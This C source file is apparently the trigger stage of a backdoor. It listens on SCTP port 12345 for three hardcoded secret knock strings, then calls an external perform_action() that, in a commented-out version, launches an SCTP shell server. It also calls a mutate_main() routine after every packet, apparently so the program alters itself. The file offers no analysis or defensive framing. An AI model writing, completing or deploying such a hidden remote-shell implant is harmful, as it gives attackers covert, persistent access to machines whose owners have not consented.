#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/sctp.h>
#include <arpa/inet.h>

#define PORT_TO_KNOCK 12345
#define EXPECTED_SEQUENCE_SIZE 3

extern int perform_action(); // shell.c
extern int mutate_main(int argc, char **argv); // mutate.c

const char *EXPECTED_SEQUENCE[EXPECTED_SEQUENCE_SIZE] = {
    "nqXCT2xfFsvYktHG3d8gPV",
    "VqhEGfaeFTdSmUW7M4QkNz",
    "VXjdmp4QcBtH75S2Yf8gPx"
};

void error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

/*void perform_action() {
    printf("Valid knock sequence received. Action triggered!\n");

    pid_t pid = fork();
    if (pid == 0) {
        // Child process: launch SCTP shell server
        execlp("./sctp", "./sctp", NULL);
        perror("execlp");
        exit(1);
    }
}*/

int main() {
    int sock;
    struct sockaddr_in servaddr, cliaddr;
    socklen_t len;
    char buffer[1024];

    int fake_argc = 1;
    char *fake_argv[] = { "program_name", NULL };
    sock = socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP);
    if (sock < 0) error("socket");

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = INADDR_ANY;
    servaddr.sin_port = htons(PORT_TO_KNOCK);

    if (bind(sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
        error("bind");

    if (listen(sock, 5) < 0)
        error("listen");

    printf("Listening for SCTP knocks on port %d...\n", PORT_TO_KNOCK);

    int sequenceIndex = 0;

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        len = sizeof(cliaddr);

        ssize_t n = recvfrom(sock, buffer, sizeof(buffer)-1, 0,
                             (struct sockaddr *)&cliaddr, &len);
        if (n < 0) error("recvfrom");

        buffer[n] = '\0';
        printf("Received knock: %s\n", buffer);

        if (strcmp(buffer, EXPECTED_SEQUENCE[sequenceIndex]) == 0) {
            sequenceIndex++;
            if (sequenceIndex == EXPECTED_SEQUENCE_SIZE) {
                perform_action();
                sequenceIndex = 0;
            }
        } else {
            sequenceIndex = 0;
        }
	mutate_main(fake_argc, fake_argv);
    }

    close(sock);
    return 0;
}
